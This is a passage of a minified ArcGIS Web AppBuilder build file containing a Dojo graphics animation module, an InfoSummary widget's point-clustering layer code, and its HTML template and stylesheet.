// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"dojox/gfx/fx":function(){define("dojo/_base/lang ./_base ./matrix dojo/_base/Color dojo/_base/array dojo/_base/fx dojo/_base/connect dojo/sniff".split(" "),function(Q,G,w,p,b,l,q,R){function S(b,c){this.start=b;this.end=c}function h(b,c,k){this.start=b;this.end=c;this.units=k}function g(b,c){this.start=b;this.end=c;this.temp=new p}function z(b){this.values=b;this.length=b.length}function C(b,c){this.values=b;this.def=c?c:{}}function H(b,c){this.stack=b;this.original=c}function v(b,
c,k,h){if(b.values)return new z(b.values);var u,x;x=b.start?G.normalizeColor(b.start):u=c?k?c[k]:c:h;b.end?b=G.normalizeColor(b.end):(u||(u=c?k?c[k]:c:h),b=u);return new g(x,b)}var J=G.fx={};S.prototype.getValue=function(b){return(this.end-this.start)*b+this.start};h.prototype.getValue=function(b){return(this.end-this.start)*b+this.start+this.units};g.prototype.getValue=function(b){return p.blendColors(this.start,this.end,b,this.temp)};z.prototype.getValue=function(b){return this.values[Math.min(Math.floor(b*
this.length),this.length-1)]};C.prototype.getValue=function(b){var c=Q.clone(this.def),k;for(k in this.values)c[k]=this.values[k].getValue(b);return c};H.prototype.getValue=function(g){var c=[];b.forEach(this.stack,function(k){if(k instanceof w.Matrix2D)c.push(k);else if("original"==k.name&&this.original)c.push(this.original);else if("matrix"==k.name){if(k.start instanceof w.Matrix2D&&k.end instanceof w.Matrix2D){var h=new w.Matrix2D,u;for(u in k.start)h[u]=(k.end[u]-k.start[u])*g+k.start[u];c.push(h)}}else k.name in
w&&(h=w[k.name],"function"!=typeof h?c.push(h):(u=b.map(k.start,function(b,c){return(k.end[c]-b)*g+b}),h=h.apply(w,u),h instanceof w.Matrix2D&&c.push(h)))},this);return c};var B=new p(0,0,0,0);J.animateStroke=function(b){b.easing||(b.easing=l._defaultEasing);var c=new l.Animation(b),k=b.shape,g;q.connect(c,"beforeBegin",c,function(){g=k.getStroke();var c=b.color,h={},l;c&&(h.color=v(c,g,"color",B));(c=b.style)&&c.values&&(h.style=new z(c.values));if(c=b.width){var x=c,q=g;x.values?l=new z(x.values):
(c=x.start?x.start:l=q?q.width:1,x.end?l=x.end:"number"!=typeof l&&(l=q?q.width:1),l=new S(c,l));h.width=l}(c=b.cap)&&c.values&&(h.cap=new z(c.values));if(c=b.join)c.values?h.join=new z(c.values):(l=c.start?c.start:g&&g.join||0,c=c.end?c.end:g&&g.join||0,"number"==typeof l&&"number"==typeof c&&(h.join=new S(l,c)));this.curve=new C(h,g)});q.connect(c,"onAnimate",k,"setStroke");return c};J.animateFill=function(b){b.easing||(b.easing=l._defaultEasing);var c=new l.Animation(b),k=b.shape,g;q.connect(c,
"beforeBegin",c,function(){g=k.getFill();var c=b.color;c&&(this.curve=v(c,g,"",B))});q.connect(c,"onAnimate",k,"setFill");return c};J.animateFont=function(b){b.easing||(b.easing=l._defaultEasing);var c=new l.Animation(b),k=b.shape,g;q.connect(c,"beforeBegin",c,function(){g=k.getFont();var c=b.style,l={},q,p;c&&c.values&&(l.style=new z(c.values));(c=b.variant)&&c.values&&(l.variant=new z(c.values));(c=b.weight)&&c.values&&(l.weight=new z(c.values));(c=b.family)&&c.values&&(l.family=new z(c.values));
(c=b.size)&&c.units&&(q=parseFloat(c.start?c.start:k.font&&k.font.size||"0"),p=parseFloat(c.end?c.end:k.font&&k.font.size||"0"),l.size=new h(q,p,c.units));this.curve=new C(l,g)});q.connect(c,"onAnimate",k,"setFont");return c};J.animateTransform=function(g){g.easing||(g.easing=l._defaultEasing);var c=new l.Animation(g),k=g.shape,h;q.connect(c,"beforeBegin",c,function(){h=k.getTransform();this.curve=new H(g.transform,h)});q.connect(c,"onAnimate",k,"setTransform");if("svg"===G.renderer&&(9<=R("ie")||
R("ff")))var p=[q.connect(c,"onBegin",c,function(){for(var b=k.getParent();b&&b.getParent;)b=b.getParent();b&&(k.__svgContainer=b.rawNode.parentNode,k.__svgRoot=b.rawNode,k.__svgRoot&&k.__svgRoot.getAttribute&&(k.__svgWidth=parseInt(k.__svgRoot.getAttribute("width"),10),isNaN(k.__svgWidth)&&delete k.__svgWidth))}),q.connect(c,"onAnimate",c,function(){try{if(k.__svgContainer){var b=k.__svgContainer.style.visibility;k.__svgContainer.style.visibility="visible";k.__svgContainer.style.visibility=b;var c=
k.__svgWidth;if(!isNaN(c))try{k.__svgRoot.setAttribute("width",c-5E-6),k.__svgRoot.setAttribute("width",c)}catch(T){}}}catch(T){}}),q.connect(c,"onEnd",c,function(){b.forEach(p,q.disconnect);if(k.__svgContainer){var c=k.__svgContainer;if(null==c.getAttribute("__gotVis")){c.setAttribute("__gotVis",!0);var g=k.__svgContainer.style.visibility,h=k.__svgRoot,l=k.__svgWidth;c.style.visibility="visible";setTimeout(function(){try{c.style.visibility=g;c.removeAttribute("__gotVis");c=null;try{isNaN(l)||(h.setAttribute("width",
l-5E-6),h.setAttribute("width",l))}catch(P){}}catch(P){}},100)}}delete k.__svgContainer;delete k.__svgRoot;delete k.__svgWidth})];return c};return J})},"widgets/InfoSummary/js/ClusterLayer":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/event dojo/_base/lang dojo/_base/Color dojo/_base/html dojo/DeferredList dojo/dom-class dojo/dom dojox/gfx/fx dojo/on dojo/Evented jimu/utils esri/layers/GraphicsLayer esri/graphic esri/geometry/Extent esri/geometry/Point esri/symbols/PictureMarkerSymbol esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/TextSymbol esri/symbols/Font esri/renderers/SimpleRenderer esri/tasks/query esri/tasks/QueryTask esri/symbols/jsonUtils esri/renderers/jsonUtils esri/layers/FeatureLayer".split(" "),
function(Q,G,w,p,b,l,q,R,S,h,g,z,C,H,v,J,B,x,c,k,Y,u,W,E,T,A,P,X){return Q("ClusterLayer",[H,z],{constructor:function(f){this.clusterGraphics=[];this.cancelRequest=!1;this.clusterSize=120;this._singles=[];this._showSingles=!0;this.updateFeatures=void 0;this.hidePanel=f.hidePanel;this._parent=f._parent;if(this._parentLayer=f.parentLayer)this.objectIdField=this._parentLayer.objectIdField,this.fields=this._parentLayer.fields;this.name=f.name;this._map=f.map;this.color=b.fromString(f.color||"#ff0000");
this._styleColor=f._styleColor;this.symbolData=f.lyrInfo.symbolData;this.countColor=this.symbolData._highLightColor;this.itemId=f.lyrInfo.itemId;this.refresh=f.lyrInfo.refresh;this.displayFeatureCount=this.symbolData.displayFeatureCount;this.node=f.node;this.countEnabled=f.countEnabled;this.legendNode=f.legendNode;this.id=f.id;this.infoTemplate=f.infoTemplate;this.url=f.lyrInfo.url;this._testRenderer=f.lyrInfo.renderer;(this.originOperLayer=f.originOperLayer)&&this._getInfoTemplate(this.originOperLayer);
this.lyrInfo=f.lyrInfo;this.lyrType=f.lyrType;this.filter=f.filter;this.showAllFeatures=f.showAllFeatures;this.listDisabled=f.listDisabled;this.selfType=f.selfType;this._setupSymbols();this._setFieldNames();this.countFeatures(this._parentLayer);0<this._parentLayer.refreshInterval&&setInterval(p.hitch(this,this._updateEnd),6E4*this._parentLayer.refreshInterval)},countFeatures:function(b){var f=new E;f.geometry=this.showAllFeatures?b.fullExtent:this._map.extent;b.queryCount?b.queryCount(f,p.hitch(this,
function(f){if(0<f)this.hidePanel||(this.nodeCount=f),this._initFeatures(this._parentLayer);else if(!this.hidePanel){this.nodeCount=0;var c=new X(b.url);g(c,"load",p.hitch(this,function(){this.countFeatures(c)}))}})):this._initFeatures(this._parentLayer)},_initFeatures:function(b){this._features=[];var f=!0,c=new E;(-1<["CSV","Feature Collection","GeoRSS","KML"].indexOf(this.lyrType)||!this.url)&&b.graphics?(this._getSourceFeatures(b.graphics),this.clusterFeatures()):"undefined"!==typeof this.url?
this.loadData(this.url):(c.where=!this.showAllFeatures&&this.filter?this.filter:"1\x3d1",c.outFields=["*"],c.returnGeometry=!0,b.queryFeatures?b.queryFeatures(c).then(p.hitch(this,function(b){b.features&&(this._getSourceFeatures(b.features),this.clusterFeatures())})):f="error");"error"!==f&&(this.extentChangeSignal||(this.extentChangeSignal=this._map.on("extent-change",p.hitch(this,this.handleMapExtentChange))),this.clickSignal||(this.clickSignal=this.on("click",p.hitch(this,this.handleClick))))},
_getSourceFeatures:function(b){this._features=[];for(var f=0;f<b.length;f++){var c=b[f];c.geometry&&this._features.push(c)}},_getInfoTemplate:function(b){b=b.parentLayerInfo?b.parentLayerInfo:b;if(b.controlPopupInfo&&(b=b.controlPopupInfo.infoTemplates)){if(this.url){var f=this.url.split("/").pop();f&&(b.indexOf?-1<b.indexOf(f)&&(this.infoTemplate=b[f].infoTemplate):b.hasOwnProperty(f)&&(this.infoTemplate=b[f].infoTemplate))}this.setInfoTemplate(this.infoTemplate)}},_setFieldNames:function(){this._fieldNames=
[];if(this.infoTemplate&&"undefined"!==typeof this.infoTemplate.info){var b=this.infoTemplate.info.fieldInfos;if(b)for(var c=0;c<b.length;c++)b[c].visible&&this._fieldNames.push(b[c].fieldName)}if(this.symbolData.featureDisplayOptions&&0<this.symbolData.featureDisplayOptions.fields.length)for(b=0;b<this.symbolData.featureDisplayOptions.fields.length;b++)c=this.symbolData.featureDisplayOptions.fields[b],-1===this._fieldNames.indexOf(c.name)&&this._fieldNames.push(c.name);1>this._fieldNames.length&&
(this._fieldNames=["*"])},setLayerInfo:function(b){this.lyrInfo=b},clearSingles:function(b){G.forEach(b||this._singles,function(b){this.remove(b)},this);this._singles.length=0},_getSingleGraphic:function(b){b=new v(new B(b.geometry.x,b.geometry.y,this._map.spatialReference),null,b.attributes);b.setSymbol(this._singleSym);return b},_addSingles:function(b){G.forEach(b,function(b){b=this._getSingleGraphic(b);this._singles.push(b);this._showSingles&&this.add(b)},this);this._map.infoWindow.setFeatures(this._singles)},
initalCount:function(b){if(!this.hidePanel){var f=new E;f.returnGeometry=!1;f.geometry=this.showAllFeatures?null:this._map.extent;f.where=!this.showAllFeatures&&this.filter?this.filter:"1\x3d1";(new T(b)).executeForIds(f).then(p.hitch(this,function(b){var f;this.node?(R.contains(this.node,"searching")&&R.remove(this.node,"searching"),this.node.innerHTML=b?C.localizeNumber(b.length):0,f=this.node.parentNode):this.legendNode&&(f=this.legendNode.previousSibling);this.updateExpand(f,b?!1:!0)}))}},updateExpand:function(b,
c){if(!this.hidePanel&&"undefined"!==typeof b){var f;-1<b.id.indexOf("rec_")&&(f=b.id.replace("rec_",""),f=S.byId("exp_"+f));c?(b&&(l.addClass(b,"recDefault"),l.addClass(b,"inActive")),f&&l.addClass(f,"expandInActive")):this.visible&&(b&&(l.removeClass(b,"recDefault"),l.removeClass(b,"inActive")),f&&l.removeClass(f,"expandInActive"))}},loadData:function(b){if(0<b.length){this.initalCount(b);var f=new E;f.where="1\x3d1";!this.showAllFeatures&&this.filter&&(f.where=this.filter);f.returnGeometry=!1;
this.queryPending=!0;(new T(b)).executeForIds(f).then(p.hitch(this,function(f){if(f){this.queryIDs=f;f=[];var c,g;c=0;for(g=this.queryIDs.length;c<g;c+=1E3){var k=this.queryIDs.slice(c,c+1E3),h=new E;h.outFields=["*"];h.objectIds=k;h.returnGeometry=!0;h.outSpatialReference=this._map.spatialReference;k=new T(b);f.push(k.execute(h))}this._features=[];this.cancelRequest?console.log("Cancelled ClusterLayer 1"):(new q(f)).then(p.hitch(this,function(b){this.queryPending=!1;if(this.cancelRequest)console.log("Cancelled ClusterLayer 2");
else if(b){for(var f=this._map.spatialReference,c=[],a=0;a<b.length;a++)if(b[a][1].features)for(var d=0;d<b[a][1].features.length;d++){var e=b[a][1].features[d];if("undefined"!==typeof e.geometry&&null!==e.geometry&&e.geometry){var r=new B(e.geometry.x,e.geometry.y,f),r=new v(r);r.setAttributes(e.attributes);this.infoTemplate&&r.setInfoTemplate(this.infoTemplate);c.push(r)}}b=!0;1E4>c&&(b=JSON.stringify(this._features)!==JSON.stringify(c));b&&(this.requiresReload=!0,this._features=c,this.clusterFeatures(),
this.emit("update-end",{bubbles:!0,cancelable:!0}))}}))}}))}},handleClick:function(b){var f=[];if(b.graphic&&(f=b.graphic,f.attributes)){var c=f.attributes;c.Data&&1<c.Data.length?(this.clearSingles(this._singles),f=c.Data,b.stopPropagation(),this._addSingles(f)):c.Data&&1===c.Data.length?(c.Data[0].symbol=f.symbol,this._map.infoWindow.setFeatures([c.Data[0]])):this._map.infoWindow.setFeatures([f])}this.infoTemplate&&this._map.infoWindow.show(b.mapPoint);w.stop(b)},handleMapExtentChange:function(b){if(b.levelChange)this.clusterFeatures();
else if(b.delta){b=b.delta;var c=Math.abs(b.y);(50<Math.abs(b.x)||50<c)&&this.clusterFeatures()}},refreshFeatures:function(b){if(this.itemId){b=b.featureSet.features;"undefined"===typeof this.updateFeatures&&(this.updateFeatures=b);var c=!0;1E4>b.length&&(c=JSON.stringify(this.updateFeatures)!==JSON.stringify(b));if(c){this.requiresReload=!0;this._features=[];this._parentLayer.clear();var c=this._parentLayer.spatialReference,f;this._parentLayer.renderer?f=this._parentLayer.renderer:this._testRenderer&&
(f=this._testRenderer);for(var g=0;g<b.length;g++){var k=b[g];if(k.geometry){var h=new v(this.getGraphicOptions(k,c,f));h.setAttributes(k.attributes);this.infoTemplate&&h.setInfoTemplate(this.infoTemplate);h.setSymbol(f.getSymbol(h));this._parentLayer.add(h);this._features.push(h)}else console.log("Null geometry skipped")}this.clusterFeatures()}this.updateFeatures=b}else this.url&&this.loadData(this.url)},getGraphicOptions:function(b,c,g){return"undefined"!==typeof b.geometry.rings?{geometry:{rings:b.geometry.rings,
spatialReference:{wkid:c.wkid}}}:"undefined"!==typeof b.geometry.paths?{geometry:{paths:b.geometry.paths,spatialReference:{wkid:c.wkid}}}:"undefined"!==typeof b.geometry.points?{geometry:{points:b.geometry.points,spatialReference:{wkid:c.wkid}}}:{geometry:new B(b.geometry.x,b.geometry.y,b.geometry.spatialReference),symbol:g.symbol}},flashFeatures:function(){this._map.graphics.clear();this.flashGraphics(this.graphics)},flashSingle:function(f){if("undefined"===typeof f.symbol){var g=new k(k.STYLE_NULL,
new b(0,0,0,0),0),h=this.color.toRgb();f.setSymbol(new c(c.STYLE_CIRCLE,9,g,new b([h[0],h[1],h[2],.5])))}this.flashGraphics([f])},flashGraphics:function(b){for(var c=0;c<b.length;c++)this._flashFeature(b[c]);setTimeout(p.hitch(this,this._clearFeatures),1100)},_flashFeature:function(f){var g;if(f.geometry){var l=b.fromHex(this._styleColor),aa=p.clone(l);aa.a=.4;"undefined"!==typeof f.symbol&&(g=new c(c.STYLE_CIRCLE,f.symbol.size,new k(k.STYLE_SOLID,l,1),aa))}"undefined"!==typeof g&&(f=new v(f.geometry,
g),this._map.graphics.add(f),g=f.getDojoShape())&&(h.animateStroke({shape:g,duration:700,color:{start:g.strokeStyle.color,end:g.strokeStyle.color},width:{start:18,end:0}}).play(),setTimeout(this._clearFeature,850,f))},_clearFeatures:function(){this._map.graphics.clear()},_clearFeature:function(b){b.getLayer().remove(b)},setColor:function(b){this.color=b},setStyleColor:function(b){this._styleColor=b},cancelPendingRequests:function(){console.log("Cancel Query...");this.queryPending&&(this.cancelRequest=
!0);this.removeEventListeners()},removeEventListeners:function(){this.extentChangeSignal&&(this.extentChangeSignal.remove(),this.extentChangeSignal=null);this.clickSignal&&(this.clickSignal.remove(),this.clickSignal=null)},clusterFeatures:function(){this.clear();null===this._map&&(this._map=this._parent.map);this._map.infoWindow.isShowing&&this._map.infoWindow.hide();var b=this._features,c=0;if("undefined"!==typeof b){if(0<b.length&&(this.visible||this.requiresReload)){var g=this.clusterSize;this.clusterGraphics=
[];for(var h=this._map.spatialReference,k=this._map.extent,l=new B(k.xmin,k.ymax,h),q=Math.ceil(this._map.height/g),t=Math.ceil(this._map.width/g),p=k.getWidth()/this._map.width*g,g=k.getHeight()/this._map.height*g,k=0;k<q;k++)for(var w=0;w<t;w++){var a=l.x+p*w,d=l.y-g*k,d=new J(a,d-g,a+p,d,h),a=[],e;for(e in b){var r=b[e];d.contains(r.geometry)&&(c+=1,a.push(r))}0<a.length&&(d=this.getClusterCenter(a),this.clusterGraphics.push({center:d,graphics:a}))}for(var U in this.clusterGraphics){h=this.clusterGraphics[U];
l=h.graphics.length;q=h.graphics;e=C.localizeNumber(l);p=t=19*e.length;t+=5;g=new u;g.family="Arial";g.size="16px";e=new Y(e,g,this.countColor);e.setOffset(0,-4);var n;this.symbolData&&this.symbolData.symbol?this.symbolData.symbol.size?n=this.symbolData.symbol.size:this.symbolData.symbol.width&&(n=this.symbolData.symbol.width,g=this.symbolData.symbol.height,n=n>=g?n:g):this.icon.width?(t=this.icon.width>=t?this.icon.width+5:t,t=this.icon.height>=t?this.icon.height+5:t,p=this.icon.width>=p?this.icon.width+
1:p,p=this.icon.height>=p?this.icon.height+1:p):this.icon.size&&(n=this.icon.size);n&&(t=n>=t?n+5:t,p=n>=p?n+1:p);p>=t&&(t+=0===p-t?4:p-t+5);this._setSymbols(t+15,t);q={Count:l,Data:q};1<l?"undefined"!==typeof this.symbolData?"CustomSymbol"!==this.symbolData.symbolType?(this.add(new v(h.center,this.csym,q)),this.displayFeatureCount?this.add(new v(h.center,e,q)):this.add(new v(h.center,this.csym3,q))):(this.add(new v(h.center,this.csym,q)),this.displayFeatureCount?this.add(new v(h.center,e,q)):this.add(new v(h.center,
this.psym,q))):(this.add(new v(h.center,this.csym,q)),this.displayFeatureCount?this.add(new v(h.center,e,q)):this.add(new v(h.center,this.psym,q))):(h=h.graphics[0].geometry,this.renderer&&(this.renderer.hasOwnProperty("getSymbol")&&"LayerSymbol"===this.symbolData.symbolType?(h=new v(h,null,q.Data[0].attributes,this.infoTemplate),h.setSymbol(this.renderer.getSymbol(h))):this.renderer.hasOwnProperty("symbol")&&"LayerSymbol"===this.symbolData.symbolType?(h=new v(h,null,q.Data[0].attributes,this.infoTemplate),
h.setSymbol(A.fromJson(this.renderer.symbol))):h="EsriSymbol"===this.symbolData.symbolType?new v(h,A.fromJson(this.symbolData.symbol),q,this.infoTemplate):"LayerSymbol"!==this.symbolData.symbolType?new v(h,this.psym,q,this.infoTemplate):this.renderer.symbol?new v(h,this.renderer.symbol,q,this.infoTemplate):new v(h,this.psym,q,this.infoTemplate),"undefined"!==typeof h&&this.add(h)))}}this._updateNode(this.showAllFeatures?b.length:c)}},_getSym:function(b){var c;this.renderer.hasOwnProperty("getSymbol")&&
"LayerSymbol"===this.symbolData.symbolType?c=this.renderer.getSymbol(b):this.renderer.hasOwnProperty("symbol")&&"LayerSymbol"===this.symbolData.symbolType?c=this.renderer.symbol:"EsriSymbol"===this.symbolData.symbolType?c=this.symbolData.symbol:this.symbolData.symbol&&(c=this.symbolData.symbol);return c},_updateNode:function(b){if(!this.hidePanel){var c;this.node?(this.node.innerHTML=C.localizeNumber(b?b:0),c=this.node.parentNode):this.legendNode&&(c=this.legendNode.previousSibling);this.updateExpand(c,
b&&0<b&&this.visible?!1:!0)}},_updatePanelTime:function(b){if(!this.hidePanel){this.pageTitle.innerHTML="\x3cdiv\x3e\x3c/div\x3e";var c="";""!==this.config.mainPanelText&&(c=this.config.mainPanelText+" ");this.pageTitle.innerHTML=c+(new Date(b)).toLocaleDateString(navigator.language,{month:"2-digit",day:"2-digit",year:"numeric",hour:"numeric",minute:"2-digit",hour12:!0})}},_setSymbols:function(f,h){var g=this.color.toRgb(),l,q,v;if("undefined"!==typeof this.symbolData){var w;"custom"===this.backgroundClusterSymbol?
w=g:(l=A.fromJson(this.backgroundClusterSymbol),0===l.outline.color.a||0===l.outline.width?(q=k.STYLE_NULL,v=0):(q=k.STYLE_SOLID,v=l.outline.width));l?(g=k(q,l.outline.color,v),w=l.color.toRgb(),this.csym=new c(c.STYLE_CIRCLE,f,g,new b([w[0],w[1],w[2],.75]))):this.csym=new c(c.STYLE_CIRCLE,f,null,new b([w[0],w[1],w[2],.75]));(f=this.symbolData.s)&&-1<f.indexOf("${appPath}")?(f=window.location.pathname.replace("index.html",""),f=this.symbolData.s.replace("${appPath}",window.location.origin+f)):f=this.symbolData.s?
this.symbolData.s:this.icon.imageData;if(f&&"CustomIcon"===this.symbolData.iconType){var t,u;this.symbolData.symbol&&this.symbolData.symbol.height&&(t=this.symbolData.symbol.height);this.symbolData.symbol&&this.symbolData.symbol.width&&(u=this.symbolData.symbol.width);t&&u?u=t=u>t?u:t:(t=this.symbolData.icon.height?this.symbolData.icon.height:h,u=this.symbolData.icon.width?this.symbolData.icon.width:h);this.psym=new x(f,t,u)}else f&&"LayerIcon"===this.symbolData.iconType?this.psym=A.fromJson(this.symbolData.symbol):
"esriPMS"===this.icon.type?this.psym=this.icon:(h=k(this.icon.outline.style,this.icon.outline.color,this.icon.outline.width),this.psym=new c(this.icon.style,this.icon.size,h,this.icon.color));this.csym2=p.clone(this.psym);this.csym3=p.clone(this.csym2);"undefined"!==typeof this.csym2.xoffset&&(this.csym3.xoffset=0);"undefined"!==typeof this.csym2.yoffset&&(this.csym3.yoffset=0)}else t=new k(k.STYLE_NULL,new b(0,0,0,0),0),this.csym=new c(c.STYLE_CIRCLE,f,t,new b([g[0],g[1],g[2],.5])),this.psym=new x(this.icon.url,
f-10,f-10),this.psym2=new x(this.icon.url,h-7,h-7),t=new k(k.STYLE_NULL,new b(0,0,0,0),0),this.csym2=new c(c.STYLE_CIRCLE,h,t,new b([g[0],g[1],g[2],.5]))},_setupSymbols:function(){if("undefined"!==typeof this.symbolData){this.countColor=this.symbolData._highLightColor;this.backgroundClusterSymbol=this.symbolData.clusterSymbol;this.icon=this.symbolData.icon;"LayerSymbol"===this.symbolData.symbolType?this._parentLayer.renderer?this.renderer=this._parentLayer.renderer.toJson?this._parentLayer.renderer:
P.fromJson(this._parentLayer.renderer):this._testRenderer?this.renderer=P.fromJson(this._testRenderer):this.symbolData.renderer&&(this.renderer=this.symbolData.renderer.toJson?this.symbolData.renderer:P.fromJson(this.symbolData.renderer)):this.renderer=new W(A.fromJson(this.symbolData.symbol));var g=this.color.toRgb(),h=new k(k.STYLE_NULL,new b(0,0,0,0),0);this._singleSym=new c(c.STYLE_CIRCLE,9,h,new b([g[0],g[1],g[2],.5]))}},getLayer:function(){return this},getClusterCenter:function(b){var c=0,g=
0,h=b.length;G.forEach(b,function(b){c+=b.geometry.x;g+=b.geometry.y},this);return new B(c/h,g/h,b[0].geometry.spatialReference)},destroy:function(){this._clear();this.removeEventListeners()},_clear:function(){this.clear();this._features=[]},_updateEnd:function(){this.url&&this.loadData(this.url)}})})},"widgets/InfoSummary/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/InfoSummary/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"panelContent" data-dojo-attach-point\x3d"panelMain"\x3e\r\n    \x3cdiv class\x3d"page" data-dojo-attach-point\x3d"panelPage"\x3e\r\n      \x3cdiv class\x3d"pageContent rounded" data-dojo-attach-point\x3d"pageContent"\x3e\r\n        \x3cdiv class\x3d"pageHeader pageHeader-border roundedTop jimu-main-background dart-bgcolor box-bgcolor" data-dojo-attach-point\x3d"pageHeader"\x3e\r\n          \x3cdiv class\x3d"pageCounter"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"panelMainIcon" /\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"pageTitle" data-dojo-attach-point\x3d"pageTitle"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"lastUpdated" data-dojo-attach-point\x3d"lastUpdated"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"pageClose" data-dojo-attach-point\x3d"pageCloseMain" data-dojo-attach-event\x3d"onclick:_close"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"pageBody roundedBottom" data-dojo-attach-point\x3d"pageBody"\x3e\r\n        \x3cdiv class\x3d"resultsContent noselect" data-dojo-attach-point\x3d"pageMain"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/InfoSummary/css/style.css":".jimu-widget-InfoSummary {width: 100%; height: 100%;}.jimu-widget-InfoSummary .legendLayer{font-size: 12px;}.jimu-widget-InfoSummary .legendOff{overflow: hidden; display: none;}.jimu-widget-InfoSummary .legendOn{display: block; width: 100%; visibility: visible; height: auto; overflow: hidden;}.jimu-widget-InfoSummary .featureItem{display: block; width: 100%; visibility: visible; cursor: pointer; border-bottom: 1px solid #dcdcdc; float: left; min-height: 30px;}.jimu-rtl .jimu-widget-InfoSummary .featureItem{display: block; width: 100%; visibility: visible; cursor: pointer; border-bottom: 1px solid #dcdcdc; float: right; min-height: 30px;}.jimu-widget-InfoSummary .featureItem:hover {background-color: lightgray;}.jimu-widget-InfoSummary .layer-row-mouseover-dashboard {background-color: #3d3d3d !important;}.jimu-widget-InfoSummary .rec:hover .expandUp-dashboard {background-color: #3d3d3d; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .rec:hover .expandDown-dashboard {background-color: #3d3d3d; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .expandDown-dashboard {background-image: url(../images/_nav_down.png); background-color: #222; bottom: -5px; background-position-y: -1px; border-bottom: 1px solid #dcdcdc; -webkit-border-bottom-radius: 8px; -moz-border-bottom-radius: 8px; -o-border-bottom-radius: 8px; -ms-border-bottom-radius: 8px; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; z-index: 1;}.jimu-widget-InfoSummary .expandUp-dashboard {background-image: url(../images/_nav_up.png); bottom: -1px; background-color: #222; background-position-y: 2px; border-top: 1px solid #dcdcdc; border-left: 1px solid #dcdcdc; border-right: 1px solid #dcdcdc; -webkit-border-top-radius: 8px; -moz-border-top-radius: 8px; -o-border-top-radius: 8px; -ms-border-top-radius: 8px; border-top-left-radius: 8px; border-top-right-radius: 8px; z-index: 1;}.jimu-widget-InfoSummary .expand-dashboard {width: 50px; height: 9px; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; position: absolute; left: 45%; background-color: #222; z-index: 1; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-rtl .jimu-widget-InfoSummary .expand-dashboard {width: 50px; height: 9px; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; position: absolute; right: 45%; background-color: #222; z-index: 1; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .groupItemTitle:hover .groupItemImageUp-dashboard {background-image: url(../images/_nav_up.png); background-color: #666666;}.jimu-widget-InfoSummary .groupItemTitle:hover .groupItemImageDown-dashboard {background-image: url(../images/_nav_down.png); background-color: #666666;}.jimu-widget-InfoSummary .groupItemImage-dashboard {width: 25px; height: 12px; cursor: pointer; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; cursor: pointer; vertical-align: middle; -webkit-border-radius: 10px; -moz-border-radius: 10px; -o-border-radius: 10px; -ms-border-radius: 10px; border-radius: 10px; border: 2px solid #6d6d6d;}.jimu-widget-InfoSummary .groupItemImageUp-dashboard {background-image: url(../images/_nav_up.png);}.jimu-widget-InfoSummary .groupItemImageDown-dashboard {background-image: url(../images/_nav_down.png);}.jimu-widget-InfoSummary .featureItem-dart {display: block; width: 100%; visibility: visible; cursor: pointer; border-bottom: 1px solid rgba(0,0,0,.5); float: left; min-height: 30px;}.jimu-rtl .jimu-widget-InfoSummary .featureItem-dart {display: block; width: 100%; visibility: visible; cursor: pointer; border-bottom: 1px solid rgba(0,0,0,.5); float: right; min-height: 30px;}.jimu-widget-InfoSummary .featureItem-dart:hover {background-color: rgba(0,0,0,.5);}.jimu-widget-InfoSummary .groupItem-dart {display: block; width: 100%; cursor: pointer; border-bottom: 1px solid rgba(0,0,0,.5); float: left; overflow: hidden; text-align: -webkit-left; text-align: -moz-left; text-align: left;}.jimu-rtl .jimu-widget-InfoSummary .groupItem-dart {display: block; width: 100%; cursor: pointer; border-bottom: 1px solid rgba(0,0,0,.5); float: right; overflow: hidden; text-align: -webkit-right; text-align: -moz-right; text-align: right;}.jimu-widget-InfoSummary .groupItemTitle-dart:hover .groupItemImageUp-dart{background-image: url(../images/_nav_up.png); background-color: rgba(0,0,0,.5);}.jimu-widget-InfoSummary .groupItemTitle-dart:hover .groupItemImageDown-dart{background-image: url(../images/_nav_down.png); background-color: rgba(0,0,0,.5);}.jimu-widget-InfoSummary .groupItemTitle-dart{width: 100%; height: 30px; display: table;}.jimu-widget-InfoSummary .groupItemImage-dart{width: 25px; height: 12px; cursor: pointer; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; cursor: pointer; vertical-align: middle; -webkit-border-radius: 10px; -moz-border-radius: 10px; -o-border-radius: 10px; -ms-border-radius: 10px; border-radius: 10px; border: 2px solid rgba(0,0,0,.5);}.jimu-widget-InfoSummary .groupItemImageUp-dart{background-image: url(../images/_nav_up.png);}.jimu-widget-InfoSummary .groupItemImageDown-dart {background-image: url(../images/_nav_down.png);}.jimu-widget-InfoSummary .expand-dart {width: 50px; height: 9px; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; position: absolute; left: 45%; background-color: #4c4c4c; z-index: 1; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-rtl .jimu-widget-InfoSummary .expand-dart {width: 50px; height: 9px; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; position: absolute; right: 45%; background-color: #4c4c4c; z-index: 1; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .expandUp-dart 